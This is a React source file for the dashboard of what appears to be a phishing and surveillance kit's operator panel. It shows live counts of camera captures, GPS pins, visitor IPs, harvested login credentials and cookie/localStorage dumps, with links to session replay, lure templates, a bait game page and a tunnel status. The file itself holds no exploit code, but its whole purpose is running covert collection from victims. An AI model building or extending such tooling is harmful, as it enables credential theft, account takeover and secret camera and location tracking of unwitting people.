import { useEffect, useState, useCallback } from 'react'
import { api, Stats, PaginatedCaptures } from '../api/client'

function StatCard({ label, value, sub, icon }: { label: string; value: string | number; sub?: string; icon: string }) {
  return (
    <div className="stat-card stagger">
      <div className="icon">{icon}</div>
      <div className="label">{label}</div>
      <div className="value accent">{value}</div>
      {sub && <div className="sub">{sub}</div>}
    </div>
  )
}

export default function Dashboard() {
  const [stats, setStats] = useState<Stats | null>(null)
  const [loading, setLoading] = useState(true)
  const [autoRefresh, setAutoRefresh] = useState(true)
  const [lastUpdate, setLastUpdate] = useState('')
  const [recentCaptures, setRecentCaptures] = useState<PaginatedCaptures | null>(null)

  const refresh = useCallback(async () => {
    try {
      setStats(await api.stats())
      setRecentCaptures(await api.captures(1, 6))
      setLastUpdate(new Date().toLocaleTimeString())
    } catch (e) { console.error(e) }
    finally { setLoading(false) }
  }, [])

  useEffect(() => {
    refresh()
    if (autoRefresh) {
      const timer = setInterval(refresh, 3000)
      return () => clearInterval(timer)
    }
  }, [refresh, autoRefresh])

  if (loading) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="spinner"></div>
      </div>
    )
  }

  const sessionMin = stats?.first_capture ? Math.floor((Date.now() / 1000 - stats.first_capture) / 60) : 0
  const lastActive = stats?.last_capture ? Math.floor((Date.now() / 1000 - stats.last_capture) / 60) : null

  return (
    <div className="space-y-6 stagger">
      <div className="flex items-center justify-between flex-wrap gap-3 animate-fade-in">
        <div>
          <h1 className="text-xl font-bold text-primary">Dashboard</h1>
          <p className="text-sm text-tertiary mt-0.5">Real-time capture monitoring</p>
        </div>
        <div className="flex items-center gap-3">
          <span className="text-xs text-tertiary">Updated {lastUpdate}</span>
          <button
            onClick={() => setAutoRefresh(!autoRefresh)}
            className={`segmented-control ${autoRefresh ? '' : ''}`}
            style={{ background: 'none', padding: 0 }}
          >
            <span className={`inline-flex items-center gap-2 px-3 py-1.5 rounded-lg text-xs font-medium transition-all ${
              autoRefresh ? 'accent-bg accent' : 'text-tertiary'
            }`}>
              <span className={`w-1.5 h-1.5 rounded-full ${autoRefresh ? 'bg-green-400 animate-pulse-dot' : 'bg-gray-600'}`}></span>
              {autoRefresh ? 'Live' : 'Paused'}
            </span>
          </button>
        </div>
      </div>

      <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-7 gap-3">
        <StatCard label="Captures" value={stats?.total_captures ?? 0} sub={`${(stats?.total_size_mb ?? 0).toFixed(2)} MB`} icon="📷" />
        <StatCard label="Locations" value={stats?.total_locations ?? 0} sub="GPS pins" icon="📍" />
        <StatCard label="Unique IPs" value={stats?.unique_ips ?? 0} sub={`${stats?.total_ips ?? 0} visits`} icon="🌐" />
        <StatCard label="Credentials" value={stats?.total_credentials ?? 0} sub="login data" icon="🔑" />
        <StatCard label="Storage Dumps" value={stats?.total_storage_dumps ?? 0} sub="cookie/localStorage" icon="🍪" />
        <StatCard label="Data Size" value={`${(stats?.total_size_mb ?? 0).toFixed(1)}`} sub="MB total" icon="💾" />
        <StatCard label="Session" value={`${sessionMin}m`} sub={lastActive !== null ? `${lastActive}m ago` : 'waiting'} icon="⏱" />
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        <div className="content-card">
          <h3 className="text-xs font-semibold text-tertiary uppercase tracking-wider mb-4">Quick Actions</h3>
          <div className="grid grid-cols-2 gap-2">
            <a href="/captures" className="nav-link active justify-center text-center">
              <span>📷</span> View Captures
            </a>
            <a href="/locations" className="nav-link active justify-center text-center">
              <span>📍</span> View Locations
            </a>
            <a href="/ips" className="nav-link active justify-center text-center">
              <span>🌐</span> View IPs
            </a>
            <a href="/replay" className="nav-link active justify-center text-center">
              <span>⚡</span> Session Replay
            </a>
            <a href="/credentials" className="nav-link active justify-center text-center">
              <span>🔑</span> Credentials
            </a>
            <a href="/storage" className="nav-link active justify-center text-center">
              <span>🍪</span> Storage
            </a>
            <a href="/templates" className="nav-link active justify-center text-center">
              <span>🎭</span> Templates
            </a>
            <a href="/t/face-runner" target="_blank" rel="noreferrer" className="nav-link active justify-center text-center">
              <span>🎮</span> Open Game
            </a>
          </div>
        </div>

        <div className="content-card">
          <h3 className="text-xs font-semibold text-tertiary uppercase tracking-wider mb-4">System Status</h3>
          <div className="space-y-3">
            <div className="flex items-center justify-between py-1">
              <span className="text-sm text-tertiary">App Server</span>
              <span className="flex items-center gap-2 text-xs text-green-400">
                <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse-dot"></span>
                Online
              </span>
            </div>
            <div className="flex items-center justify-between py-1">
              <span className="text-sm text-tertiary">SQLite Database</span>
              <span className="flex items-center gap-2 text-xs text-green-400">
                <span className="w-1.5 h-1.5 rounded-full bg-green-400"></span>
                Connected
              </span>
            </div>
            <div className="flex items-center justify-between py-1">
              <span className="text-sm text-tertiary">TrailBase</span>
              <a href="http://localhost:4000/_/admin/" target="_blank" rel="noreferrer" className="flex items-center gap-2 text-xs accent hover:underline">
                <span className="w-1.5 h-1.5 rounded-full accent-bg" style={{ background: 'var(--accent)' }}></span>
                Admin UI
              </a>
            </div>
            <div className="flex items-center justify-between py-1">
              <span className="text-sm text-tertiary">Tunnel</span>
              <span className="flex items-center gap-2 text-xs text-green-400">
                <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse-dot"></span>
                Active
              </span>
            </div>
          </div>
        </div>
      </div>

      {recentCaptures && recentCaptures.captures.length > 0 && (
        <div className="content-card">
          <h3 className="text-xs font-semibold text-tertiary uppercase tracking-wider mb-4">Recent Captures</h3>
          <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-3">
            {recentCaptures.captures.map((c, i) => (
              <a key={c.id} href={c.url} target="_blank" rel="noreferrer"
                 className="block aspect-video bg-tertiary radius-card overflow-hidden hover:ring-2 ring-accent transition-all animate-scale-in"
                 style={{ animationDelay: `${i * 0.05}s`, animationFillMode: 'both' }}>
                <img src={c.url} alt="capture" className="w-full h-full object-cover" />
              </a>
            ))}
          </div>
        </div>
      )}
    </div>
  )
}
